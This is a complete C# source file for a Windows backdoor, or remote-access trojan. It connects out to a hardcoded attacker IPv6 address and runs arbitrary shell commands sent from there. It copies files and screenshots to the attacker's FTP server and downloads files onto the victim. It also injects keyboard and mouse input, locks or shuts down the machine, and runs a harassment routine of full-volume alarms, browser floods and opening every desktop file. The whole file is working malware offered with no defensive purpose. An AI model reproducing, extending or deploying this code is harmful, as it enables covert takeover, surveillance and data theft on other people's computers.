using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Diagnostics;
using WindowsInput;
using System.Security;
using System.Drawing;
using System.Windows.Forms;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Threading;
using FluentFTP;
using FluentFTP.Helpers;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Media;
using NAudio;
using NAudio.CoreAudioApi;
using System.Security.Policy;

namespace Backdoor
{
    internal class Backdoor
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        private const int SW_MINIMIZE = 6;
        //--------------------------------------------------------------------------------------------------------------------------------------------------------------------
        private const string ServerIPv6Address = "2600:1700:c3d0:89e0:66fb:4c0a:9483:f2d6";
        private const int PortNumber = 1117;

        public static ScreenBlock screenBlock;
        public static ScreenFlash screenFlash;

        public static Rectangle virtualScreenBounds = SystemInformation.VirtualScreen;

        public static int ScreenshotCount = 0;
        //--------------------------------------------------------------------------------------------------------------------------------------------------------------------
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    using (TcpClient client = new TcpClient(AddressFamily.InterNetworkV6))
                    {
                        client.Connect(ServerIPv6Address, PortNumber);
                        NetworkStream stream = client.GetStream();

                        //Listener for program execution
                        while (client.Connected == true)
                        {
                            string responseData = String.Empty;
                            try
                            {
                                Byte[] data = new Byte[100000];

                                // Read the first batch of the TcpServer response bytes.
                                Int32 bytes = stream.Read(data, 0, data.Length);
                                responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                                Console.WriteLine("Received: {0}", responseData);
                                //Run read selection
                                RunExploit(responseData, client);

                                if (responseData == string.Empty)
                                {
                                    client.Close();
                                    Thread.Sleep(5000);
                                    client.Connect(ServerIPv6Address, PortNumber);
                                    //Process.Start("shutdown", "/s /t 0");
                                }
                            }
                            catch (ArgumentNullException e)
                            {
                                Console.WriteLine("ArgumentNullException: {0}", e);
                            }
                            catch (SocketException e)
                            {
                                Console.WriteLine("SocketException: {0}", e);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
            }

        }

        static void ServerReply(string Reply, TcpClient client)
        {
            byte[] data = Encoding.UTF8.GetBytes(Reply);
            NetworkStream stream = client.GetStream();
            stream.Write(data, 0, data.Length);
        }

        private static void MinimizeWindows()
        {
            EnumWindows((hWnd, lParam) =>
            {
                if (IsWindowVisible(hWnd))
                {
                    ShowWindow(hWnd, SW_MINIMIZE);
                }
                return true;
            }, IntPtr.Zero);
        }
        //------------------------------------------------------------------------------------------------------------------------------//


        public static void RunExploit(string ID, TcpClient client)
        {
            if (ID.StartsWith("cmd:"))
            {
                string command = ID.Substring(4);
                RunCMD(command, client);
            }
            else if (ID.StartsWith("take:"))
            {
                string Rpath = ID.Substring(5);
                TakeFile(Rpath, client);
            }
            else if (ID.StartsWith("send:"))
            {
                string Spath = ID.Substring(5);
                SendFile(Spath, client);
            }
            else if (ID.Equals("shutdown"))
            {
                Process.Start("shutdown", "/s /t 0");
            }
            else if (ID.StartsWith("keyboard:"))
            {
                string text = ID.Substring(9);
                Keyboard(text, client);
            }
            else if (ID.StartsWith("mouse:"))
            {
                string text = ID.Substring(6);
                Mouse(text, client);
            }
            else if (ID.StartsWith("screenblock:"))
            {
                string show = ID.Substring(12);
                BlockScreen(show, client);
            }
            else if (ID.StartsWith("screenshot"))
            {
                TakeScreenshot(client);
            }
            else if (ID.StartsWith("dropbomb"))
            {
                DropBomb(client);
            }
            else if (ID.StartsWith("screenfuck"))
            {
                screenFuck(client);
            }
        }

        public static void RunCMD(string command, TcpClient client)
        {
            string reply = string.Empty;

            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            Process process = new Process();
            process.StartInfo = psi;

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            if (error != string.Empty)
            {
                reply = error;
            }
            reply = output;

            process.WaitForExit();

            ServerReply(reply, client);
        }

        public static void TakeFile(string path, TcpClient client)
        {
            using (var ftpclient = new FtpClient(ServerIPv6Address, "backdoor", "backdoor", 21))
            {
                try
                {
                    ftpclient.Connect();
                    ftpclient.SetWorkingDirectory(ftpclient.GetWorkingDirectory().ToString());
                    ftpclient.UploadFile(path, Path.GetFileName(path));
                    ServerReply("Success!", client);
                }
                catch (Exception ex)
                {
                    ServerReply(ex.ToString(), client);
                }
                finally
                {
                    ftpclient.Disconnect();
                }
            }
        }

        public static void SendFile(string paths, TcpClient client)
        {
            string[] path = paths.Split(',');
            string filename = path[0];

            using (var ftpclient = new FtpClient(ServerIPv6Address, "backdoor", "backdoor", 21))
            {
                string localPath = (path[1] + filename);
                string FTPpath = (ftpclient.GetWorkingDirectory().ToString() + filename);
                try
                {
                    ftpclient.Connect();
                    ftpclient.SetWorkingDirectory(ftpclient.GetWorkingDirectory().ToString());
                    ftpclient.DownloadFile(localPath, FTPpath);
                    ServerReply("Success!", client);
                }
                catch (Exception ex)
                {
                    ServerReply(ex.ToString(), client);
                }
                finally
                {
                    ftpclient.Disconnect();
                }
            }
        }

        public static void Keyboard(string text, TcpClient client)
        {
            InputSimulator inputSimulator = new InputSimulator();
            inputSimulator.Keyboard.TextEntry(text);
            ServerReply("Success!", client);
        }

        public static void Mouse(string move, TcpClient client)
        {
            InputSimulator inputSimulator = new InputSimulator();

            if (move.Equals("up"))
            {
                inputSimulator.Mouse.MoveMouseBy(0, -25);
                ServerReply("Success!", client);
            }
            else if (move.Equals("down"))
            {
                inputSimulator.Mouse.MoveMouseBy(0, 25);
                ServerReply("Success!", client);
            }
            else if (move.Equals("left"))
            {
                inputSimulator.Mouse.MoveMouseBy(-25, 0);
                ServerReply("Success!", client);
            }
            else if (move.Equals("right"))
            {
                inputSimulator.Mouse.MoveMouseBy(25, 0);
                ServerReply("Success!", client);
            }
            else if (move.Equals("left click"))
            {
                inputSimulator.Mouse.LeftButtonClick();
                ServerReply("Success!", client);
            }
            else if (move.Equals("right click"))
            {
                inputSimulator.Mouse.RightButtonClick();
                ServerReply("Success!", client);
            }
            else if (move.Equals("scroll up"))
            {
                inputSimulator.Mouse.VerticalScroll(3);
                ServerReply("Success!", client);
            }
            else if (move.Equals("scroll down"))
            {
                inputSimulator.Mouse.VerticalScroll(-3);
                ServerReply("Success!", client);
            }
            else if (move.Equals("scroll left"))
            {
                inputSimulator.Mouse.HorizontalScroll(-3);
                ServerReply("Success!", client);
            }
            else if (move.Equals("scroll right"))
            {
                inputSimulator.Mouse.HorizontalScroll(3);
                ServerReply("Success!", client);
            }
            else if (move.Equals("sleep"))
            {
                inputSimulator.Mouse.Sleep(10000);
                ServerReply("Success!", client);
            }
        }

        //----------------------------------------------------------
        public static void BlockScreen(string show, TcpClient client)
        {
            if (show.Equals("enable"))
            {
                MinimizeWindows();
                Task.Run(() => RunFormInBackground());
                ServerReply("Success!", client);
            }
            else if (show.Equals("disable"))
            {
                if (screenBlock != null)
                {
                    screenBlock.Invoke((Action)(() =>
                    {
                        screenBlock.Close();
                        ServerReply("Success!", client);
                    }));
                }
            }
        }
        private static void RunFormInBackground()
        {
            screenBlock = new ScreenBlock();
            screenBlock.Bounds = virtualScreenBounds;
            screenBlock.Size = virtualScreenBounds.Size;
            screenBlock.TopMost = true;
            Application.Run(screenBlock);

        }
        //----------------------------------------------------------
        public static void TakeScreenshot(TcpClient client)
        {
            try
            {
                Rectangle bounds = SystemInformation.VirtualScreen;

                using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
                {
                    using (Graphics graphics = Graphics.FromImage(screenshot))
                    {
                        graphics.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                    }

                    screenshot.Save((Path.GetTempPath() + ScreenshotCount.ToString() + ".png"), System.Drawing.Imaging.ImageFormat.Png);

                    using (var ftpclient = new FtpClient(ServerIPv6Address, "backdoor", "backdoor", 21))
                    {
                        try
                        {
                            ftpclient.Connect();
                            ftpclient.SetWorkingDirectory(ftpclient.GetWorkingDirectory().ToString());
                            ftpclient.UploadFile(((Path.GetTempPath() + ScreenshotCount.ToString() + ".png")), (ScreenshotCount.ToString() + ".png"));
                            ServerReply("Success!", client);
                            ScreenshotCount++;
                            File.Delete((Path.GetTempPath() + ScreenshotCount.ToString() + ".png"));
                        }
                        catch (Exception ex)
                        {
                            ServerReply(ex.ToString(), client);
                        }
                        finally
                        {
                            ftpclient.Disconnect();
                        }
                    }

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        public static void DropBomb(TcpClient client)
        {
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            MMDevice defaultDevice = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

            float initialVolume = defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar;

            defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;

            SoundPlayer player = new SoundPlayer(Properties.Resources.Bomb);
            ServerReply("Success!", client);
            player.PlaySync();
            defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar = initialVolume;
        }
        //----------------------------------------------------------
        public static void screenFuck(TcpClient client)
        {
            ServerReply("Starting Screenfuck 😈", client);
            MinimizeWindows();

            screenFlash = new ScreenFlash();
            screenFlash.Bounds = virtualScreenBounds;
            screenFlash.Size = virtualScreenBounds.Size;
            screenFlash.TopMost = true;

            //set the volume to max
            MMDeviceEnumerator enumerator = new MMDeviceEnumerator();
            MMDevice defaultDevice = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);

            float initialVolume = defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar;

            defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar = 1.0f;

            SoundPlayer player = new SoundPlayer(Properties.Resources.Alarm);
            player.Play();

            Thread.Sleep(500);

            try
            {
                //Start flashing the screen

                screenFlash.Show();
            }
            catch (Exception ex)
            {
                SoundPlayer alarm2 = new SoundPlayer(Properties.Resources.Alarm2);
                alarm2.Play();
                Console.WriteLine($"{ex.Message}");
                InputSimulator inputSimulator = new InputSimulator();
                Random random = new Random();

                //Random mouse movements
                for (int i = 0; i < 13; i++)
                {
                    int randX = random.Next(0, 65536);
                    int randY = random.Next(0, 65536);

                    inputSimulator.Mouse.MoveMouseToPositionOnVirtualDesktop(randX, randY);

                    Thread.Sleep(1000);
                }

                //Open many msedge tabs
                for (int t = 0; t < 25; t++)
                {
                    Process.Start("msedge", $"--new-window https://static.wikia.nocookie.net/r-interminable-rooms/images/7/73/Trollface.png/revision/latest?cb=20230318173938");
                    Thread.Sleep(500);
                }

                defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar = initialVolume;

                //Open everything on the desktop
                string[] DesktopFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));

                foreach (string DesktopFile in DesktopFiles)
                {
                    Process.Start(DesktopFile);
                }

            }
        }
    }
}
